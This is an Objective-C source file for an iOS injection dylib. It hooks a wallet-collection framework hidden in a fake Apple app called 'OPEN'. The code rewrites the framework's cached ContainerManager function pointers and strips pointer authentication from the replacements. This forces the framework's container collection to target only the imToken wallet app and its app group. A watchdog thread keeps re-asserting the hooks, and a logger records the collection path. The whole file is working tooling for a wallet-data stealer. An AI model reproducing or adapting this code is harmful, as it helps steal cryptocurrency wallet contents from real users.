// blocker.m
// -----------------------------------------------------------------------------
// Hook dylib for the wallet-collection framework "libuiopsersvc"
// (com.uiopser.svc) bundled inside the fake
// com.apple.mobile.MobileHouseArrest app ("OPEN").
//
// Goal: keep the framework running, but make its container collection target
// ONLY imToken (im.token.app). Every other app (other wallets + Apple's own
// apps) must be left out of the collection list.
//
// How: the framework resolves the private ContainerManager (MCM) C API at
// runtime via dlsym() and caches the function pointers in a global table in
// __bss at slide+0x12fb78:
//     +0x00 dlopen handle
//     +0x08 container_query_create
//     +0x10 container_query_set_class
//     +0x18 container_query_set_identifiers        <- forced to im.token.app
//     +0x20 container_query_set_group_identifiers  <- forced to imToken group
//     +0x28 container_query_operation_set_flags
//     +0x30 container_query_operation_set_part
//     +0x38 container_query_operation_set_part_domain
//     +0x40 container_query_get_single_result
//     +0x48 container_query_get_last_error
//     +0x50 container_query_iterate_results_sync
//     +0x58 free
// The framework calls container_query_set_identifiers(query,
// xpc_string_create(identifier)) with a single xpc string (or an xpc array).
// We overwrite the cached pointers with our own functions that always
// substitute the imToken identifier, so no matter which wallet/app the caller
// asked for, only imToken's container is ever resolved.
//
// No jailbreak: no inline hooks (MSHookFunction). We only rewrite writable
// function-pointer slots in the framework's own __bss and let it call us. The
// framework dispatches the dlsym result through a plain (non-authenticated)
// `blr`, so the pointers we store must be ptrauth-stripped.
//
// Diagnostics: every hook logs to a file inside the app container
// ($HOME/Documents/blocker.log, falling back to Library/Caches, tmp, /tmp) so
// the actual collection path can be inspected without a live console.
// -----------------------------------------------------------------------------

#import <Foundation/Foundation.h>
#import <mach-o/dyld.h>
#import <mach-o/loader.h>
#import <dlfcn.h>
#import <string.h>
#import <stdint.h>
#import <stdarg.h>
#import <limits.h>
#import <pthread.h>
#import <unistd.h>
#import <fcntl.h>
#import <stdlib.h>
#import <sys/time.h>
#if __has_feature(ptrauth_calls)
#include <ptrauth.h>
#endif

#define FW_NAME          "libuiopsersvc"
#define TARGET_BUNDLE_ID "im.token.app"
#define TARGET_GROUP_ID  "33TTGQRSP8.im.token.app"

// Offset (from image base) of the framework's cached MCM API table.
#define FW_MCM_TABLE_OFF 0x12fb78ULL

// =============================================================================
// Container log
// =============================================================================

static int  g_logfd = -1;
static char g_logpath[PATH_MAX];

static void blog_open(void) {
    const char *home = getenv("HOME");
    char p1[PATH_MAX], p2[PATH_MAX], p3[PATH_MAX];
    const char *cands[4];
    int n = 0;
    if (home && home[0]) {
        snprintf(p1, sizeof(p1), "%s/Documents/blocker.log", home);
        snprintf(p2, sizeof(p2), "%s/Library/Caches/blocker.log", home);
        snprintf(p3, sizeof(p3), "%s/tmp/blocker.log", home);
        cands[n++] = p1;
        cands[n++] = p2;
        cands[n++] = p3;
    }
    cands[n++] = "/tmp/blocker.log";
    for (int i = 0; i < n; i++) {
        int fd = open(cands[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd >= 0) {
            g_logfd = fd;
            snprintf(g_logpath, sizeof(g_logpath), "%s", cands[i]);
            return;
        }
    }
}

static void blog(const char *fmt, ...) {
    char msg[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);

    struct timeval tv;
    gettimeofday(&tv, NULL);
    struct tm tmv;
    localtime_r(&tv.tv_sec, &tmv);
    char line[1200];
    int n = snprintf(line, sizeof(line),
                     "[%02d:%02d:%02d.%03d][blk][%d] %s\n",
                     tmv.tm_hour, tmv.tm_min, tmv.tm_sec,
                     (int)(tv.tv_usec / 1000), (int)getpid(), msg);
    if (n > 0) {
        if (g_logfd >= 0) {
            ssize_t w = write(g_logfd, line, (size_t)n);
            (void)w;
        }
        NSLog(@"[blocker] %s", msg);
    }
}

// =============================================================================
// xpc helpers (resolved lazily; libxpc is always present)
// =============================================================================

typedef void *(*xpc_string_create_t)(const char *);
typedef void *(*xpc_array_create_t)(const void **, size_t);
typedef void  (*xpc_array_append_value_t)(void *, void *);
typedef void *(*xpc_get_type_t)(void *);
typedef char *(*xpc_copy_description_t)(void *);
typedef const char *(*xpc_type_get_name_t)(void *);

static xpc_string_create_t      p_xpc_string_create = NULL;
static xpc_array_create_t       p_xpc_array_create = NULL;
static xpc_array_append_value_t p_xpc_array_append_value = NULL;
static xpc_get_type_t           p_xpc_get_type = NULL;
static xpc_copy_description_t   p_xpc_copy_description = NULL;
static xpc_type_get_name_t      p_xpc_type_get_name = NULL;
static void                    *p_xpc_type_array = NULL; // *_xpc_type_array

static void ensure_xpc(void) {
    if (!p_xpc_string_create)
        p_xpc_string_create = (xpc_string_create_t)dlsym(RTLD_DEFAULT, "xpc_string_create");
    if (!p_xpc_array_create)
        p_xpc_array_create = (xpc_array_create_t)dlsym(RTLD_DEFAULT, "xpc_array_create");
    if (!p_xpc_array_append_value)
        p_xpc_array_append_value = (xpc_array_append_value_t)dlsym(RTLD_DEFAULT, "xpc_array_append_value");
    if (!p_xpc_get_type)
        p_xpc_get_type = (xpc_get_type_t)dlsym(RTLD_DEFAULT, "xpc_get_type");
    if (!p_xpc_copy_description)
        p_xpc_copy_description = (xpc_copy_description_t)dlsym(RTLD_DEFAULT, "xpc_copy_description");
    if (!p_xpc_type_get_name)
        p_xpc_type_get_name = (xpc_type_get_name_t)dlsym(RTLD_DEFAULT, "xpc_type_get_name");
    if (!p_xpc_type_array) {
        void *t = dlsym(RTLD_DEFAULT, "_xpc_type_array");
        if (t) p_xpc_type_array = *(void **)t;
    }
}

// Human-readable description of an xpc object (rotating buffers so that a
// single printf may describe several objects at once).
static const char *xdesc(void *obj) {
    static char bufs[4][512];
    static int  idx = 0;
    char *out = bufs[idx = (idx + 1) & 3];
    out[0] = 0;
    if (!obj) {
        snprintf(out, 512, "(null)");
        return out;
    }
    if (p_xpc_copy_description) {
        char *d = p_xpc_copy_description(obj);
        if (d) {
            snprintf(out, 512, "%s", d);
            free(d);
            return out;
        }
    }
    if (p_xpc_get_type && p_xpc_type_get_name) {
        void *ty = p_xpc_get_type(obj);
        const char *nm = ty ? p_xpc_type_get_name(ty) : NULL;
        if (nm) snprintf(out, 512, "<%s>", nm);
        else    snprintf(out, 512, "%p", obj);
        return out;
    }
    snprintf(out, 512, "%p", obj);
    return out;
}

static int xis_array(void *obj) {
    if (!obj || !p_xpc_get_type || !p_xpc_type_array) return 0;
    return p_xpc_get_type(obj) == p_xpc_type_array;
}

// Build an xpc value holding `bid`, mirroring the shape of `orig`
// (array stays array, everything else becomes a plain string).
static void *make_id(const char *bid, void *orig) {
    if (!p_xpc_string_create) return orig;
    void *s = p_xpc_string_create(bid);
    if (!s) return orig;
    if (xis_array(orig) && p_xpc_array_create && p_xpc_array_append_value) {
        void *arr = p_xpc_array_create(NULL, 0);
        if (arr) {
            p_xpc_array_append_value(arr, s);
            return arr;
        }
    }
    return s;
}

// =============================================================================
// Locate + parse the loaded framework image (to get its slide)
// =============================================================================

static const struct mach_header_64 *g_fw    = NULL;
static uintptr_t                   g_slide = 0;

static const struct mach_header_64 *find_fw(void) {
    uint32_t n = _dyld_image_count();
    for (uint32_t i = 0; i < n; i++) {
        const char *nm = _dyld_get_image_name(i);
        if (nm && strstr(nm, FW_NAME))
            return (const struct mach_header_64 *)_dyld_get_image_header(i);
    }
    return NULL;
}

static void ensure_fw_loaded(void) {
    g_fw = find_fw();
    if (g_fw) return;
    // Not yet mapped (our dylib may init before it). Force-load it from the
    // host app's Frameworks directory.
    const char *exe = _dyld_get_image_name(0);
    if (!exe) return;
    char dir[PATH_MAX];
    strncpy(dir, exe, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = 0;
    char *sl = strrchr(dir, '/');
    if (!sl) return;
    *sl = 0; // .../OPEN.app
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/Frameworks/%s.framework/%s", dir, FW_NAME, FW_NAME);
    if (dlopen(path, RTLD_NOW)) g_fw = find_fw();
}

// Compute the image slide (loaded __TEXT vmaddr vs. header address).
static void parse_fw(void) {
    if (!g_fw || g_slide) return;
    const struct mach_header_64 *mh = g_fw;
    const uint8_t *p = (const uint8_t *)mh + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *sc = (const struct segment_command_64 *)lc;
            if (strcmp(sc->segname, "__TEXT") == 0) {
                g_slide = (uintptr_t)mh - sc->vmaddr;
                return;
            }
        }
        p += lc->cmdsize;
    }
}

// The framework calls the dlsym result through a plain `blr`, i.e. without
// pointer authentication, so the pointer we publish must have its PAC removed.
static void *plain_ptr(void *p) {
#if __has_feature(ptrauth_calls)
    return ptrauth_strip(p, ptrauth_key_asia);
#else
    return p;
#endif
}

// =============================================================================
// Slots
// =============================================================================

enum {
    H_CREATE = 0,
    H_SETCLASS,
    H_SETIDS,
    H_SETGRP,
    H_FLAGS,
    H_PART,
    H_GETONE,
    H_ITER,
    H_COUNT
};

static const uintptr_t kOff[H_COUNT] = {
    0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x40, 0x50
};
static const char *kSym[H_COUNT] = {
    "container_query_create",
    "container_query_set_class",
    "container_query_set_identifiers",
    "container_query_set_group_identifiers",
    "container_query_operation_set_flags",
    "container_query_operation_set_part",
    "container_query_get_single_result",
    "container_query_iterate_results_sync"
};

static void *g_ours[H_COUNT];
static void *g_orig[H_COUNT];

typedef void *(*gen8_t)(void *, void *, void *, void *, void *, void *, void *, void *);

static void *fwd(int i, void *a0, void *a1, void *a2, void *a3,
                 void *a4, void *a5, void *a6, void *a7) {
    void *o = g_orig[i];
    if (!o) return NULL;
    return ((gen8_t)o)(a0, a1, a2, a3, a4, a5, a6, a7);
}

// --- the two enforcing hooks ------------------------------------------------

static void *h_setids(void *q, void *ids, void *a2, void *a3,
                      void *a4, void *a5, void *a6, void *a7) {
    void *forced = make_id(TARGET_BUNDLE_ID, ids);
    blog("set_identifiers   q=%p orig=%s -> %s", q, xdesc(ids), xdesc(forced));
    return fwd(H_SETIDS, q, forced, a2, a3, a4, a5, a6, a7);
}

static void *h_setgrp(void *q, void *ids, void *a2, void *a3,
                      void *a4, void *a5, void *a6, void *a7) {
    void *forced = make_id(TARGET_GROUP_ID, ids);
    blog("set_group_ids     q=%p orig=%s -> %s", q, xdesc(ids), xdesc(forced));
    return fwd(H_SETGRP, q, forced, a2, a3, a4, a5, a6, a7);
}

// --- logging-only passthrough hooks (diagnostics) ---------------------------

static void *h_create(void *a0, void *a1, void *a2, void *a3,
                      void *a4, void *a5, void *a6, void *a7) {
    void *r = fwd(H_CREATE, a0, a1, a2, a3, a4, a5, a6, a7);
    blog("query_create      -> %p", r);
    return r;
}

static void *h_setclass(void *q, void *cls, void *a2, void *a3,
                        void *a4, void *a5, void *a6, void *a7) {
    blog("set_class         q=%p class=%llu", q, (unsigned long long)(uintptr_t)cls);
    return fwd(H_SETCLASS, q, cls, a2, a3, a4, a5, a6, a7);
}

static void *h_flags(void *q, void *f, void *a2, void *a3,
                     void *a4, void *a5, void *a6, void *a7) {
    blog("op_set_flags      q=%p flags=0x%llx", q, (unsigned long long)(uintptr_t)f);
    return fwd(H_FLAGS, q, f, a2, a3, a4, a5, a6, a7);
}

static void *h_part(void *q, void *p, void *a2, void *a3,
                    void *a4, void *a5, void *a6, void *a7) {
    blog("op_set_part       q=%p part=%llu", q, (unsigned long long)(uintptr_t)p);
    return fwd(H_PART, q, p, a2, a3, a4, a5, a6, a7);
}

static void *h_getone(void *q, void *a1, void *a2, void *a3,
                      void *a4, void *a5, void *a6, void *a7) {
    void *r = fwd(H_GETONE, q, a1, a2, a3, a4, a5, a6, a7);
    blog("get_single_result q=%p -> %s", q, xdesc(r));
    return r;
}

static void *h_iter(void *q, void *ctx, void *blk, void *a3,
                    void *a4, void *a5, void *a6, void *a7) {
    blog("iterate_sync      q=%p ctx=%p block=%p", q, ctx, blk);
    return fwd(H_ITER, q, ctx, blk, a3, a4, a5, a6, a7);
}

// =============================================================================
// Install / re-assert
// =============================================================================

static void prepare_ours(void) {
    g_ours[H_CREATE]   = plain_ptr((void *)h_create);
    g_ours[H_SETCLASS] = plain_ptr((void *)h_setclass);
    g_ours[H_SETIDS]   = plain_ptr((void *)h_setids);
    g_ours[H_SETGRP]   = plain_ptr((void *)h_setgrp);
    g_ours[H_FLAGS]    = plain_ptr((void *)h_flags);
    g_ours[H_PART]     = plain_ptr((void *)h_part);
    g_ours[H_GETONE]   = plain_ptr((void *)h_getone);
    g_ours[H_ITER]     = plain_ptr((void *)h_iter);
}

static void *slot_at(int i) {
    return (void *)(g_slide + FW_MCM_TABLE_OFF + kOff[i]);
}

static void dump_table(void) {
    if (!g_slide) { blog("dump_table: no slide yet"); return; }
    uintptr_t base = g_slide + FW_MCM_TABLE_OFF;
    blog("--- MCM table @%p ---", (void *)base);
    for (int i = 0; i < 14; i++) {
        void **s = (void **)(base + (uintptr_t)i * 8);
        blog("  +0x%02x = %p", i * 8, *s);
    }
}

// Only publish into slots that the framework has already populated. If the
// slot is still 0 we must NOT install (there would be nothing to forward to,
// which would silently turn the call into a no-op and break collection).
static void install_all(void) {
    if (!g_slide) return;
    for (int i = 0; i < H_COUNT; i++) {
        void * volatile *slot = (void * volatile *)slot_at(i);
        void *cur = *slot;
        if (cur == 0) continue;
        if (cur == g_ours[i]) continue;
        if (g_orig[i] != cur) {
            g_orig[i] = cur;
            blog("real %-38s = %p", kSym[i], cur);
        }
        *slot = g_ours[i];
        blog("HOOK %-38s (+0x%02llx) was %p", kSym[i],
             (unsigned long long)kOff[i], cur);
    }
}

static void *watchdog_main(void *arg) {
    (void)arg;
    // Poll quickly right after launch (the framework resolves the table lazily),
    // then settle into a slow re-assert forever.
    for (int i = 0; i < 8000; i++) {
        if (!g_slide) { ensure_fw_loaded(); parse_fw(); }
        install_all();
        usleep(1000);
    }
    int tick = 0;
    for (;;) {
        install_all();
        if ((++tick % 50) == 0) {   // ~ every 10s
            blog("-- heartbeat --");
            dump_table();
        }
        usleep(200000);
    }
    return NULL;
}

// =============================================================================
// Entry point
// =============================================================================

__attribute__((constructor))
static void blocker_init(void) {
    @autoreleasepool {
        blog_open();
        blog("================ blocker init ================");
        blog("pid=%d uid=%d euid=%d", (int)getpid(), (int)getuid(), (int)geteuid());
        blog("exe=%s", _dyld_get_image_name(0) ? _dyld_get_image_name(0) : "?");
        blog("HOME=%s", getenv("HOME") ? getenv("HOME") : "(null)");
        blog("log=%s", g_logpath[0] ? g_logpath : "(none)");

        ensure_xpc();
        blog("xpc: string_create=%p array_create=%p get_type=%p "
             "copy_description=%p type_array=%p",
             (void *)p_xpc_string_create, (void *)p_xpc_array_create,
             (void *)p_xpc_get_type, (void *)p_xpc_copy_description,
             p_xpc_type_array);
        blog("dlsym(RTLD_DEFAULT,'container_query_set_identifiers')=%p",
             dlsym(RTLD_DEFAULT, "container_query_set_identifiers"));

        ensure_fw_loaded();
        blog("framework %s = %p", FW_NAME, (void *)g_fw);
        parse_fw();
        blog("slide = 0x%lx   table = %p",
             (unsigned long)g_slide,
             g_slide ? (void *)(g_slide + FW_MCM_TABLE_OFF) : NULL);

        prepare_ours();
        dump_table();
        install_all();
        dump_table();

        pthread_t th;
        if (pthread_create(&th, NULL, watchdog_main, NULL) == 0) pthread_detach(th);

        blog("imToken-only collection hook installed (target=%s group=%s)",
             TARGET_BUNDLE_ID, TARGET_GROUP_ID);
    }
}
